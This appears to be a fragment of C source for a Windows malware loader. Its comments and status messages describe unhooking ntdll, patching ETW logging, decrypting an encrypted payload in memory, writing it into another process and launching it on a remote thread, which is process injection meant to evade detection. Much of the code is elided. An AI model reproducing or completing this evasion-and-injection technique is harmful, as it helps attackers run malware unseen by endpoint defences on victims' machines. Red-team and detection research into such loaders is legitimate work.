...
int main()
{
	// Copy ntdll to a fresh memory alloc and overwrite calls addresses
	...
	// PATCH ETW : from https://github.com/Hagrid29/RemotePatcher/blob/main/RemotePatcher/RemotePatcher.cpp
	printf("\n-> Patching ETW writer\n");
	...
	printf("\n-> Decrypting the payload in memory\n");
	...
	if(!WriteProcessMemory(pi.hProcess, NTAlloc, NqQlPkEKGs, sizeof NqQlPkEKGs, nbBytes)) {
		printf("\n\t[!] WriteProcessMemory() failed, status code: %u\n", GetLastError());
		return 1;
	}
	...
	if (!NT_SUCCESS(NTCreateThread)) {
		printf("\n\t[!] Error executing the payload in unhooked process, status code: (%u)\n", GetLastError());
		return 1;
	}

	// Resume legitimate process ?
